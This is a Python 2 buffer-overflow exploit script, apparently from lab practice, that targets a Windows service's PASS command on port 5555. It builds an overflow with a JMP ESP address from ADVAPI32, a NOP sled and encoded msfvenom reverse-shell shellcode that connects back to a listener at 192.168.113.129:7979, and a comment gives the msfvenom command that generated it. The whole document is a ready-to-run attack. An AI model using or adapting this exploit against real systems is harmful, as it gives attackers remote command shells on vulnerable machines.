import sys, socket
from time import sleep
#locate the 4 caracter for the EIP crash at 1040 with parametro 'PASS ' + 1040 '\x41' + '\x42\x42\x42\x42' (3000 - 1040 - 4 - 32 '\x90')
#77365D33   FFE4             JMP ESP
#'\x33\x5D\x36\x77'          ADVAPI32 (system)
#'\x42\x42\x42\x42'
#msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.113.129 LPORT=7979 -e x86/shikata_ga_nai -b "\x00"  -f c
buf = (
"\xda\xc9\xd9\x74\x24\xf4\xba\xce\x8f\x2f\xf7\x5d\x2b\xc9\xb1"
"\x52\x31\x55\x17\x03\x55\x17\x83\x23\x73\xcd\x02\x47\x64\x90"
"\xed\xb7\x75\xf5\x64\x52\x44\x35\x12\x17\xf7\x85\x50\x75\xf4"
"\x6e\x34\x6d\x8f\x03\x91\x82\x38\xa9\xc7\xad\xb9\x82\x34\xac"
"\x39\xd9\x68\x0e\x03\x12\x7d\x4f\x44\x4f\x8c\x1d\x1d\x1b\x23"
"\xb1\x2a\x51\xf8\x3a\x60\x77\x78\xdf\x31\x76\xa9\x4e\x49\x21"
"\x69\x71\x9e\x59\x20\x69\xc3\x64\xfa\x02\x37\x12\xfd\xc2\x09"
"\xdb\x52\x2b\xa6\x2e\xaa\x6c\x01\xd1\xd9\x84\x71\x6c\xda\x53"
"\x0b\xaa\x6f\x47\xab\x39\xd7\xa3\x4d\xed\x8e\x20\x41\x5a\xc4"
"\x6e\x46\x5d\x09\x05\x72\xd6\xac\xc9\xf2\xac\x8a\xcd\x5f\x76"
"\xb2\x54\x3a\xd9\xcb\x86\xe5\x86\x69\xcd\x08\xd2\x03\x8c\x44"
"\x17\x2e\x2e\x95\x3f\x39\x5d\xa7\xe0\x91\xc9\x8b\x69\x3c\x0e"
"\xeb\x43\xf8\x80\x12\x6c\xf9\x89\xd0\x38\xa9\xa1\xf1\x40\x22"
"\x31\xfd\x94\xe5\x61\x51\x47\x46\xd1\x11\x37\x2e\x3b\x9e\x68"
"\x4e\x44\x74\x01\xe5\xbf\x1f\xee\x52\xce\x5e\x86\xa0\x30\x7e"
"\x7c\x2c\xd6\xea\x92\x78\x41\x83\x0b\x21\x19\x32\xd3\xff\x64"
"\x74\x5f\x0c\x99\x3b\xa8\x79\x89\xac\x58\x34\xf3\x7b\x66\xe2"
"\x9b\xe0\xf5\x69\x5b\x6e\xe6\x25\x0c\x27\xd8\x3f\xd8\xd5\x43"
"\x96\xfe\x27\x15\xd1\xba\xf3\xe6\xdc\x43\x71\x52\xfb\x53\x4f"
"\x5b\x47\x07\x1f\x0a\x11\xf1\xd9\xe4\xd3\xab\xb3\x5b\xba\x3b"
"\x45\x90\x7d\x3d\x4a\xfd\x0b\xa1\xfb\xa8\x4d\xde\x34\x3d\x5a"
"\xa7\x28\xdd\xa5\x72\xe9\xed\xef\xde\x58\x66\xb6\x8b\xd8\xeb"
"\x49\x66\x1e\x12\xca\x82\xdf\xe1\xd2\xe7\xda\xae\x54\x14\x97"
"\xbf\x30\x1a\x04\xbf\x10") # Payload size: 351 bytes 
target = sys.argv[1]
buff = 1040 * '\x41' + '\x33\x5D\x36\x77' + 32 * '\x90' + buf 

while True:
   try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((target,5555))
    s.recv(1024)

    s.send("PASS " +buff)
    s.close()
    sleep(1)

   except:
    print "[+] Crash occured with buffer length: "+str(len(buff)-50)
    sys.exit()
